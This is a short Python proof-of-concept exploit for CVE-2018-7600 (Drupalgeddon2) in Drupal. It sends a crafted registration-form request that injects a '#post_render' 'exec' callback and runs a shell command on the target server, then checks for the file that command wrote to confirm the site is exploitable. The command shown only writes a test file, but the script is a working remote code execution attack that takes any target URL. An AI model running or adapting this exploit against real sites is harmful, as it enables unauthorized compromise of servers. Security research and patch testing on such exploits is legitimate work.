import sys
import requests
 
print (&#039;################################################################&#039;)
print (&#039;# Proof-Of-Concept for CVE-2018-7600&#039;)
print (&#039;# by Vitalii Rudnykh&#039;)
print (&#039;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#039;)
print (&#039;# https://github.com/a2u/CVE-2018-7600&#039;)
print (&#039;################################################################&#039;)
print (&#039;Provided only for educational or information purposes\n&#039;)
 
target = input(&#039;Enter target url (example: https://domain.ltd/): &#039;)
 
# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
# set verify = False if your proxy certificate is self signed
# remember to set proxies both for http and https
# 
# example:
# proxies = {&#039;http&#039;: &#039;http://127.0.0.1:8080&#039;, &#039;https&#039;: &#039;http://127.0.0.1:8080&#039;}
# verify = False
proxies = {}
verify = True
 
url = target + &#039;user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax&#039;
payload = {&#039;form_id&#039;: &#039;user_register_form&#039;, &#039;_drupal_ajax&#039;: &#039;1&#039;, &#039;mail[#post_render][]&#039;: &#039;exec&#039;, &#039;mail[#type]&#039;: &#039;markup&#039;, &#039;mail[#markup]&#039;: &#039;echo ";-)" | tee hello.txt&#039;}
 
r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + &#039;hello.txt&#039;)
if check.status_code != 200:
  sys.exit("Not exploitable")
print (&#039;\nCheck: &#039;+target+&#039;hello.txt&#039;)

